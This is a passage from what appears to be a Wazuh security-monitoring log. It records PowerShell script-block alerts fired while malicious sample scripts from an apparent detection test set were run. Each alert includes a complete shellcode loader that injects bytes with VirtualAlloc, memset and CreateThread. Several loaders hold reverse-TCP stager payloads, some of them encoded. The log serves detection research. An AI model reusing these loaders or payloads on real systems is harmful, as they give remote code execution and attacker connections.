dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x16,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"75011030-ead2-4fed-bfc3-d4884e42d656","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\682.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:22:11.021+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":219,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304531.4346016","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:31.4504941Z","eventRecordID":"145959","processID":"4236","threadID":"7952","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x05,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 3c6990f2-a543-40c4-9eda-b9a8da02f9a5\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\683.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x05,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"3c6990f2-a543-40c4-9eda-b9a8da02f9a5","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\683.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:22:12.042+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":220,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304532.4357017","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:32.2291659Z","eventRecordID":"145964","processID":"4136","threadID":"8216","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$eh6e = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $eh6e -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x56,0x60,0xe7,0xe4,0xdb,0xd2,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x47,0x83,0xc5,0x04,0x31,0x45,0x0f,0x03,0x45,0x59,0x82,0x12,0x18,0x8d,0xc0,0xdd,0xe1,0x4d,0xa5,0x54,0x04,0x7c,0xe5,0x03,0x4c,0x2e,0xd5,0x40,0x00,0xc2,0x9e,0x05,0xb1,0x51,0xd2,0x81,0xb6,0xd2,0x59,0xf4,0xf9,0xe3,0xf2,0xc4,0x98,0x67,0x09,0x19,0x7b,0x56,0xc2,0x6c,0x7a,0x9f,0x3f,0x9c,0x2e,0x48,0x4b,0x33,0xdf,0xfd,0x01,0x88,0x54,0x4d,0x87,0x88,0x89,0x05,0xa6,0xb9,0x1f,0x1e,0xf1,0x19,0xa1,0xf3,0x89,0x13,0xb9,0x10,0xb7,0xea,0x32,0xe2,0x43,0xed,0x92,0x3b,0xab,0x42,0xdb,0xf4,0x5e,0x9a,0x1b,0x32,0x81,0xe9,0x55,0x41,0x3c,0xea,0xa1,0x38,0x9a,0x7f,0x32,0x9a,0x69,0x27,0x9e,0x1b,0xbd,0xbe,0x55,0x17,0x0a,0xb4,0x32,0x3b,0x8d,0x19,0x49,0x47,0x06,0x9c,0x9e,0xce,0x5c,0xbb,0x3a,0x8b,0x07,0xa2,0x1b,0x71,0xe9,0xdb,0x7c,0xda,0x56,0x7e,0xf6,0xf6,0x83,0xf3,0x55,0x9e,0x60,0x3e,0x66,0x5e,0xef,0x49,0x15,0x6c,0xb0,0xe1,0xb1,0xdc,0x39,0x2c,0x45,0x23,0x10,0x88,0xd9,0xda,0x9b,0xe9,0xf0,0x18,0xcf,0xb9,0x6a,0x89,0x70,0x52,0x6b,0x36,0xa5,0xcf,0x6e,0xa0,0x2a,0x2d,0xcf,0xb9,0xdb,0x4f,0x2f,0xa8,0x43,0xd9,0xc9,0x9a,0x23,0x89,0x45,0x5a,0x94,0x69,0x36,0x32,0xfe,0x65,0x69,0x22,0x01,0xac,0x02,0xc8,0xee,0x19,0x7a,0x64,0x96,0x03,0xf0,0x15,0x57,0x9e,0x7c,0x15,0xd3,0x2d,0x80,0xdb,0x14,0x5b,0x92,0x8b,0xd4,0x16,0xc8,0x1d,0xea,0x8c,0x67,0xa1,0x7e,0x2b,0x2e,0xf6,0x16,0x31,0x17,0x30,0xb9,0xca,0x72,0x4b,0x70,0x5f,0x3d,0x23,0x7d,0x8f,0xbd,0xb3,0x2b,0xc5,0xbd,0xdb,0x8b,0xbd,0xed,0xfe,0xd3,0x6b,0x82,0x53,0x46,0x94,0xf3,0x00,0xc1,0xfc,0xf9,0x7f,0x25,0xa3,0x02,0xaa,0xb7,0x9f,0xd4,0x92,0xcd,0xf1,0xe4;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Otjb=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Otjb.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Otjb,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 1dd5aff9-eca2-4fbc-92f5-0c2c2a63b9b9\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\685.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$eh6e = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $eh6e -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x56,0x60,0xe7,0xe4,0xdb,0xd2,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x47,0x83,0xc5,0x04,0x31,0x45,0x0f,0x03,0x45,0x59,0x82,0x12,0x18,0x8d,0xc0,0xdd,0xe1,0x4d,0xa5,0x54,0x04,0x7c,0xe5,0x03,0x4c,0x2e,0xd5,0x40,0x00,0xc2,0x9e,0x05,0xb1,0x51,0xd2,0x81,0xb6,0xd2,0x59,0xf4,0xf9,0xe3,0xf2,0xc4,0x98,0x67,0x09,0x19,0x7b,0x56,0xc2,0x6c,0x7a,0x9f,0x3f,0x9c,0x2e,0x48,0x4b,0x33,0xdf,0xfd,0x01,0x88,0x54,0x4d,0x87,0x88,0x89,0x05,0xa6,0xb9,0x1f,0x1e,0xf1,0x19,0xa1,0xf3,0x89,0x13,0xb9,0x10,0xb7,0xea,0x32,0xe2,0x43,0xed,0x92,0x3b,0xab,0x42,0xdb,0xf4,0x5e,0x9a,0x1b,0x32,0x81,0xe9,0x55,0x41,0x3c,0xea,0xa1,0x38,0x9a,0x7f,0x32,0x9a,0x69,0x27,0x9e,0x1b,0xbd,0xbe,0x55,0x17,0x0a,0xb4,0x32,0x3b,0x8d,0x19,0x49,0x47,0x06,0x9c,0x9e,0xce,0x5c,0xbb,0x3a,0x8b,0x07,0xa2,0x1b,0x71,0xe9,0xdb,0x7c,0xda,0x56,0x7e,0xf6,0xf6,0x83,0xf3,0x55,0x9e,0x60,0x3e,0x66,0x5e,0xef,0x49,0x15,0x6c,0xb0,0xe1,0xb1,0xdc,0x39,0x2c,0x45,0x23,0x10,0x88,0xd9,0xda,0x9b,0xe9,0xf0,0x18,0xcf,0xb9,0x6a,0x89,0x70,0x52,0x6b,0x36,0xa5,0xcf,0x6e,0xa0,0x2a,0x2d,0xcf,0xb9,0xdb,0x4f,0x2f,0xa8,0x43,0xd9,0xc9,0x9a,0x23,0x89,0x45,0x5a,0x94,0x69,0x36,0x32,0xfe,0x65,0x69,0x22,0x01,0xac,0x02,0xc8,0xee,0x19,0x7a,0x64,0x96,0x03,0xf0,0x15,0x57,0x9e,0x7c,0x15,0xd3,0x2d,0x80,0xdb,0x14,0x5b,0x92,0x8b,0xd4,0x16,0xc8,0x1d,0xea,0x8c,0x67,0xa1,0x7e,0x2b,0x2e,0xf6,0x16,0x31,0x17,0x30,0xb9,0xca,0x72,0x4b,0x70,0x5f,0x3d,0x23,0x7d,0x8f,0xbd,0xb3,0x2b,0xc5,0xbd,0xdb,0x8b,0xbd,0xed,0xfe,0xd3,0x6b,0x82,0x53,0x46,0x94,0xf3,0x00,0xc1,0xfc,0xf9,0x7f,0x25,0xa3,0x02,0xaa,0xb7,0x9f,0xd4,0x92,0xcd,0xf1,0xe4;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Otjb=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Otjb.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Otjb,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"1dd5aff9-eca2-4fbc-92f5-0c2c2a63b9b9","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\685.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:22:13.197+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":221,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304533.4368382","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:33.0392900Z","eventRecordID":"145969","processID":"6188","threadID":"7676","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$aepXKZ = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $aepXKZ -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xdb,0xbf,0xd9,0x6a,0x54,0x42,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x31,0x78,0x18,0x83,0xc0,0x04,0x03,0x78,0xcd,0x88,0xa1,0xbe,0x05,0xce,0x4a,0x3f,0xd5,0xaf,0xc3,0xda,0xe4,0xef,0xb0,0xaf,0x56,0xc0,0xb3,0xe2,0x5a,0xab,0x96,0x16,0xe9,0xd9,0x3e,0x18,0x5a,0x57,0x19,0x17,0x5b,0xc4,0x59,0x36,0xdf,0x17,0x8e,0x98,0xde,0xd7,0xc3,0xd9,0x27,0x05,0x29,0x8b,0xf0,0x41,0x9c,0x3c,0x75,0x1f,0x1d,0xb6,0xc5,0xb1,0x25,0x2b,0x9d,0xb0,0x04,0xfa,0x96,0xea,0x86,0xfc,0x7b,0x87,0x8e,0xe6,0x98,0xa2,0x59,0x9c,0x6a,0x58,0x58,0x74,0xa3,0xa1,0xf7,0xb9,0x0c,0x50,0x09,0xfd,0xaa,0x8b,0x7c,0xf7,0xc9,0x36,0x87,0xcc,0xb0,0xec,0x02,0xd7,0x12,0x66,0xb4,0x33,0xa3,0xab,0x23,0xb7,0xaf,0x00,0x27,0x9f,0xb3,0x97,0xe4,0xab,0xcf,0x1c,0x0b,0x7c,0x46,0x66,0x28,0x58,0x03,0x3c,0x51,0xf9,0xe9,0x93,0x6e,0x19,0x52,0x4b,0xcb,0x51,0x7e,0x98,0x66,0x38,0x16,0x6d,0x4b,0xc3,0xe6,0xf9,0xdc,0xb0,0xd4,0xa6,0x76,0x5f,0x54,0x2e,0x51,0x98,0x9b,0x05,0x25,0x36,0x62,0xa6,0x56,0x1e,0xa0,0xf2,0x06,0x08,0x01,0x7b,0xcd,0xc8,0xae,0xae,0x78,0xcc,0x38,0xcb,0x3b,0xec,0x9b,0x83,0xc1,0xf0,0xca,0x0f,0x4f,0x16,0xbc,0xff,0x1f,0x87,0x7c,0x50,0xe0,0x77,0x14,0xba,0xef,0xa8,0x04,0xc5,0x25,0xc1,0xae,0x2a,0x90,0xb9,0x46,0xd2,0xb9,0x32,0xf7,0x1b,0x14,0x3f,0x37,0x97,0x9b,0xbf,0xf9,0x50,0xd1,0xd3,0x6d,0x91,0xac,0x8e,0x3b,0xae,0x1a,0xa4,0xc3,0x3a,0xa1,0x6f,0x94,0xd2,0xab,0x56,0xd2,0x7c,0x53,0xbd,0x69,0xb4,0xc1,0x7e,0x05,0xb9,0x05,0x7f,0xd5,0xef,0x4f,0x7f,0xbd,0x57,0x34,0x2c,0xd8,0x97,0xe1,0x40,0x71,0x02,0x0a,0x31,0x26,0x85,0x62,0xbf,0x11,0xe1,0x2c,0x40,0x74,0xf3,0x11,0x97,0xb0,0x81,0x7b,0x2b;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$aepX=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($aepX.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$aepX,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 72ddfa8a-5c64-4bc3-bbf1-0aad1c731d2e\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\703.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$aepXKZ = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $aepXKZ -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xdb,0xbf,0xd9,0x6a,0x54,0x42,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x31,0x78,0x18,0x83,0xc0,0x04,0x03,0x78,0xcd,0x88,0xa1,0xbe,0x05,0xce,0x4a,0x3f,0xd5,0xaf,0xc3,0xda,0xe4,0xef,0xb0,0xaf,0x56,0xc0,0xb3,0xe2,0x5a,0xab,0x96,0x16,0xe9,0xd9,0x3e,0x18,0x5a,0x57,0x19,0x17,0x5b,0xc4,0x59,0x36,0xdf,0x17,0x8e,0x98,0xde,0xd7,0xc3,0xd9,0x27,0x05,0x29,0x8b,0xf0,0x41,0x9c,0x3c,0x75,0x1f,0x1d,0xb6,0xc5,0xb1,0x25,0x2b,0x9d,0xb0,0x04,0xfa,0x96,0xea,0x86,0xfc,0x7b,0x87,0x8e,0xe6,0x98,0xa2,0x59,0x9c,0x6a,0x58,0x58,0x74,0xa3,0xa1,0xf7,0xb9,0x0c,0x50,0x09,0xfd,0xaa,0x8b,0x7c,0xf7,0xc9,0x36,0x87,0xcc,0xb0,0xec,0x02,0xd7,0x12,0x66,0xb4,0x33,0xa3,0xab,0x23,0xb7,0xaf,0x00,0x27,0x9f,0xb3,0x97,0xe4,0xab,0xcf,0x1c,0x0b,0x7c,0x46,0x66,0x28,0x58,0x03,0x3c,0x51,0xf9,0xe9,0x93,0x6e,0x19,0x52,0x4b,0xcb,0x51,0x7e,0x98,0x66,0x38,0x16,0x6d,0x4b,0xc3,0xe6,0xf9,0xdc,0xb0,0xd4,0xa6,0x76,0x5f,0x54,0x2e,0x51,0x98,0x9b,0x05,0x25,0x36,0x62,0xa6,0x56,0x1e,0xa0,0xf2,0x06,0x08,0x01,0x7b,0xcd,0xc8,0xae,0xae,0x78,0xcc,0x38,0xcb,0x3b,0xec,0x9b,0x83,0xc1,0xf0,0xca,0x0f,0x4f,0x16,0xbc,0xff,0x1f,0x87,0x7c,0x50,0xe0,0x77,0x14,0xba,0xef,0xa8,0x04,0xc5,0x25,0xc1,0xae,0x2a,0x90,0xb9,0x46,0xd2,0xb9,0x32,0xf7,0x1b,0x14,0x3f,0x37,0x97,0x9b,0xbf,0xf9,0x50,0xd1,0xd3,0x6d,0x91,0xac,0x8e,0x3b,0xae,0x1a,0xa4,0xc3,0x3a,0xa1,0x6f,0x94,0xd2,0xab,0x56,0xd2,0x7c,0x53,0xbd,0x69,0xb4,0xc1,0x7e,0x05,0xb9,0x05,0x7f,0xd5,0xef,0x4f,0x7f,0xbd,0x57,0x34,0x2c,0xd8,0x97,0xe1,0x40,0x71,0x02,0x0a,0x31,0x26,0x85,0x62,0xbf,0x11,0xe1,0x2c,0x40,0x74,0xf3,0x11,0x97,0xb0,0x81,0x7b,0x2b;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$aepX=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($aepX.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$aepX,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"72ddfa8a-5c64-4bc3-bbf1-0aad1c731d2e","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\703.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:22:14.187+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":222,"mail":false,"groups":["windows"," 